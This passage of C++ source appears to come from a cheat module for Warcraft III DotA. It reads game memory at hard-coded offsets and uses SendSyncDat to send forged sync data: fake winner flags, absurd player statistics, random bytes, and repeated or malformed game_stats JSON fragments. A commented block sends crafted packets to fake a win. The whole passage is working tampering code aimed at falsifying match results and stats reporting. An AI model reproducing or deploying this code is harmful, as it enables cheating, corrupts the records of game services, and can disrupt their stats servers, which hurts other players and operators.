					{"new_year_bounty_find",p.players[9].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[9].new_year_rare_present_find},
					{"rax_kills",p.players[9].rax_kills},
					{"tower_kills",p.players[9].tower_kills}
				},
			}
		}
	};
}

std::vector<std::string> split_by_size(const std::string& str, int n)
{
	std::vector<std::string> substrings;

	for (size_t i = 0; i < str.size(); i += n) {
		substrings.push_back(str.substr(i, n));
	}

	return substrings;
}

int dota_json_index = -1;

void SendAllDataAsDota()
{
	for (int i = 1; i <= 5; i++)
	{
		SendSyncDat(std::to_string(i), "1", -1);
		SendSyncDat(std::to_string(i), "2", -1);
		SendSyncDat(std::to_string(i), "3", 100);
		SendSyncDat(std::to_string(i), "4", 200);
		SendSyncDat(std::to_string(i), "5", 99999999);
		SendSyncDat(std::to_string(i), "6", -2);
		SendSyncDat(std::to_string(i), "7", 15);
		SendSyncDat(std::to_string(i), "8_0", 1227902793);
		SendSyncDat(std::to_string(i), "8_1", 1227902793);
		SendSyncDat(std::to_string(i), "8_2", 1227902793);
		SendSyncDat(std::to_string(i), "8_3", 1227902793);
		SendSyncDat(std::to_string(i), "8_4", 1227902793);
		SendSyncDat(std::to_string(i), "8_5", 1227902793);
		SendSyncDat(std::to_string(i), "9", 1333027688);
		SendSyncDat(std::to_string(i), "id", i);

		SendSyncDat(std::to_string(i + 6), "1", 55);
		SendSyncDat(std::to_string(i + 6), "2", 13);
		SendSyncDat(std::to_string(i + 6), "3", 44);
		SendSyncDat(std::to_string(i + 6), "4", 556);
		SendSyncDat(std::to_string(i + 6), "5", -1);
		SendSyncDat(std::to_string(i + 6), "6", -3);
		SendSyncDat(std::to_string(i + 6), "7", 50505050);
		SendSyncDat(std::to_string(i + 6), "8_0", 1227902793);
		SendSyncDat(std::to_string(i + 6), "8_1", 1227902793);
		SendSyncDat(std::to_string(i + 6), "8_2", 1227902793);
		SendSyncDat(std::to_string(i + 6), "8_3", 1227902793);
		SendSyncDat(std::to_string(i + 6), "8_4", 1227902793);
		SendSyncDat(std::to_string(i + 6), "8_5", 1227902793);
		SendSyncDat(std::to_string(i + 6), "9", 1333027688);
		SendSyncDat(std::to_string(i + 6), "id", i + 6);
	}

	SendSyncDat("Global", "Winner", 2);
	SendSyncDat("Global", "m", 59);
	SendSyncDat("Global", "s", 59);
}

void SendDotaJsonData(DOTA_JSON_DATA_FIRST& tmpDotaJson1, DOTA_JSON_DATA_SECOND& tmpDotaJson2, DOTA_JSON_DATA& tmpDotaJson3)
{
	memset(&tmpDotaJson1, 0x7F, sizeof(DOTA_JSON_DATA_FIRST));
	memset(&tmpDotaJson2, 0x80, sizeof(DOTA_JSON_DATA_SECOND));
	memset(&tmpDotaJson3, 0x7E, sizeof(DOTA_JSON_DATA));


	json dota_json1 = tmpDotaJson1;
	json dota_json2 = tmpDotaJson2;
	json dota_json3 = tmpDotaJson3;

	std::string dota_json_dump1 = dota_json1.dump();
	auto data_json_splitted1 = split_by_size(dota_json_dump1, 128);

	for (auto& s : data_json_splitted1)
	{
		SendSyncDat("game_stats", s, dota_json_index);
	}
	SendSyncDat("game_stats", "end " + std::to_string(dota_json_index), dota_json_index);
	dota_json_index++;

	std::string dota_json_dump2 = dota_json2.dump();
	auto data_json_splitted2 = split_by_size(dota_json_dump2, 128);


	for (auto& s : data_json_splitted2)
	{
		SendSyncDat("game_stats", s, dota_json_index);
	}
	SendSyncDat("game_stats", "end " + std::to_string(dota_json_index), dota_json_index);
	dota_json_index++;

	SendAllDataAsDota();

	std::string dota_json_dump3 = dota_json2.dump();
	auto data_json_splitted3 = split_by_size(dota_json_dump3, 128);

	for (auto& s : data_json_splitted3)
	{
		SendSyncDat("game_stats", s, dota_json_index);
	}
	dota_json_index++;


	for (int i = 0; i < 50; i++)
	{
		int rnd = rand();
		SendSyncDat("game_stats", (const char*)&rnd, dota_json_index);
		SendSyncDat("game_stats", "end " + std::to_string(dota_json_index), dota_json_index);
		dota_json_index++;
	}


	for (auto& s : data_json_splitted3)
	{
		SendSyncDat("game_stats", s, dota_json_index);
	}
	SendSyncDat("game_stats", "end " + std::to_string(dota_json_index), dota_json_index);
	dota_json_index++;

	for (auto& s : data_json_splitted3)
	{
		SendSyncDat("game_stats", s, dota_json_index);
	}

	SendSyncDat("game_stats", "end " + std::to_string(0), 0);
	for (auto& s : data_json_splitted3)
	{
		SendSyncDat("game_stats", s, 0);
	}
	SendSyncDat("game_stats", "end " + std::to_string(0), 0);

}

void FillDotaJsonDataPID(DOTA_JSON_DATA_FIRST& tmpDotaJson)
{
	int id = 1;
	for (int i = 0; i < 10; i++)
	{
		tmpDotaJson.players[i].id = id;
		if (i == 5)
			i++;
		id++;
	}
}

void FillDotaJsonDataPID(DOTA_JSON_DATA_SECOND& tmpDotaJson)
{
	int id = 1;
	for (int i = 0; i < 10; i++)
	{
		tmpDotaJson.players[i].id = id;
		if (i == 5)
			i++;
		id++;
	}
}


void FillDotaJsonDataPID(DOTA_JSON_DATA& tmpDotaJson)
{
	int id = 1;
	for (int i = 0; i < 10; i++)
	{
		tmpDotaJson.players[i].id = id;
		if (i == 5)
			i++;
		id++;
	}
}

void DotaJsonMegaKill()
{
	if (dota_json_index == -2)
		dota_json_index = -1;

	DOTA_JSON_DATA_FIRST dota_json_data1 = DOTA_JSON_DATA_FIRST();
	DOTA_JSON_DATA_SECOND dota_json_data2 = DOTA_JSON_DATA_SECOND();
	DOTA_JSON_DATA dota_json_data3 = DOTA_JSON_DATA();

	FillDotaJsonDataPID(dota_json_data1);
	FillDotaJsonDataPID(dota_json_data2);
	FillDotaJsonDataPID(dota_json_data3);

	dota_json_data1.game_start_time = 231;
	dota_json_data1.first_hero_kill_time = 236;

	dota_json_data2.game_start_time = 231;
	dota_json_data2.first_hero_kill_time = 236;
	dota_json_data2.first_rax_kill_time = 1506;

	dota_json_data3.game_start_time = 231;
	dota_json_data3.first_hero_kill_time = 236;
	dota_json_data3.first_rax_kill_time = 1506;

	dota_json_data3.winner = 2;

	for (int i = 0; i < 10; i++)
	{
		dota_json_data1.players[i].assists = -1;
		dota_json_data1.players[i].creep_denies = 1000;
		dota_json_data1.players[i].creep_kills = 99999999;
		dota_json_data1.players[i].firestone = 1;
		dota_json_data1.players[i].froststone = 0;
		dota_json_data1.players[i].gold = -99999;
		dota_json_data1.players[i].left_time = 9999999;
		dota_json_data1.players[i].rax_kills = abs(rand());
		dota_json_data1.players[i].tower_kills = abs(rand());
		dota_json_data1.players[i].kills = abs(rand());
		dota_json_data1.players[i].courier_kills = -99999;
		dota_json_data1.players[i].neutral_kills = 999999;
		dota_json_data1.players[i].new_year_bounty_find = 0;
		dota_json_data1.players[i].new_year_rare_present_find = 0;
		dota_json_data1.players[i].deaths = 555;
		for (int n = 0; n < 6; n++)
		{
			dota_json_data1.players[i].items[n] = 1227902793;
		}
		dota_json_data1.players[i].hero = 1333027688;

		dota_json_data2.players[i].assists = 22;
		dota_json_data2.players[i].creep_denies = 22;
		dota_json_data2.players[i].creep_kills = 22;
		dota_json_data2.players[i].firestone = 0;
		dota_json_data2.players[i].froststone = 0;
		dota_json_data2.players[i].gold = -22222222;
		dota_json_data2.players[i].left_time = -1;
		dota_json_data2.players[i].rax_kills = abs(rand());
		dota_json_data2.players[i].tower_kills = abs(rand());
		dota_json_data2.players[i].kills = abs(rand());
		dota_json_data2.players[i].courier_kills = 77777;
		dota_json_data2.players[i].neutral_kills = -77777;
		dota_json_data2.players[i].new_year_bounty_find = 0;
		dota_json_data2.players[i].new_year_rare_present_find = 0;
		dota_json_data2.players[i].deaths = abs(rand());
		for (int n = 0; n < 6; n++)
		{
			dota_json_data2.players[i].items[n] = 1227902793;
		}
		dota_json_data2.players[i].hero = 1333027688;

		dota_json_data3.players[i].assists = abs(rand());
		dota_json_data3.players[i].creep_denies = abs(rand());
		dota_json_data3.players[i].creep_kills = abs(rand());
		dota_json_data3.players[i].firestone = 0;
		dota_json_data3.players[i].froststone = 0;
		dota_json_data3.players[i].gold = abs(rand());
		dota_json_data3.players[i].left_time = 555 + abs(rand());
		dota_json_data3.players[i].rax_kills = abs(rand());
		dota_json_data3.players[i].tower_kills = abs(rand());
		dota_json_data3.players[i].kills = abs(rand());
		dota_json_data3.players[i].courier_kills = abs(rand());
		dota_json_data3.players[i].neutral_kills = abs(rand());
		dota_json_data3.players[i].new_year_bounty_find = 0;
		dota_json_data3.players[i].new_year_rare_present_find = 0;
		dota_json_data3.players[i].deaths = abs(rand());
		for (int n = 0; n < 6; n++)
		{
			dota_json_data3.players[i].items[n] = 1333027688;
		}
		dota_json_data3.players[i].hero = 1227902793;

	}

	SendDotaJsonData(dota_json_data1, dota_json_data2, dota_json_data3);
}

DWORD sendtick = 0;

/*
*
* COMMENTED CODE
*
				/*	if (GetFrameItemAddress("GameFilterButton", 0))
					{
						if (GetModuleHandleA("war3map.dll"))
						{
							FreeLibrary(GetModuleHandleA("war3map.dll"));
						}
						if (GetModuleHandleA("war3map.override.dll"))
						{
							FreeLibrary(GetModuleHandleA("war3map.override.dll"));
						}
					}*/

					//	if (IsKeyPressed('9'))
					//	{
					//		if (!RealGameStart)
					//		{
					//			for (auto& s : win_1_array)
					//			{
					//				auto bytes = hex2bytes<unsigned char>(s);
					//				std::reverse(bytes.begin(),bytes.end());
					//				for(int i = 0; i < 20; i++)
					//				{
					//					bytes.push_back(i);
					//					SendPacket(&bytes[0], bytes.size());
					//					bytes.pop_back();
					//				}
					//			}
					//			Beep(1000, 1000);
					//		}
					//		RealGameStart = TRUE;
					//	}
					//	else
					//	{
					//		RealGameStart = FALSE;
					//	}


int PLAYER_GOLD_OFFSETS[12] = {
	0xF8, //0 player
	0x1378, //1 player
	0x2608, //2 player
	0x3888, //3 player
	0x4B18, //4 player
	0x5D98, //5 player
	0x7028, //6 player
	0x82B8, //7 player
	0x9538, //8 player
	0xA7C8, //9 player
	0xBA48, //10 player
	0xCCD8 //11 player
};

int GetCurrentGoldPlayerById(int PlayerId)
{
	if (PlayerId > -1 && PlayerId < 12)
	{
		int addr = *(int*)(GameDll + 0xAB7788);
		if (addr > 0)
		{
			addr = *(int*)(addr + 0x4);
			if (addr > 0)
			{
				addr = *(int*)(addr + 0xC);
				if (addr > 0)
				{
					addr = *(int*)(addr + PLAYER_GOLD_OFFSETS[PlayerId]);
					if (addr > 0)
						return int(addr / 10);
				}
			}
		}
	}
	return 0;
}


unsigned int GetGameTime()
{
	if (!GameDll)
	{
		return 0;
	}
	unsigned char* GameTimeOffset = GameDll + 0xAB7E98;
	return *(unsigned int*)GameTimeOffset;
}

void SimulateScourgeWinner2()
{
	SendSyncDat("dr.x", "Data", "Modexl", 0);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227902030);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227902030);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901510);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903286);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903286);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895879);
	SendSyncDat("dr.x", "Data", "Hero2", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
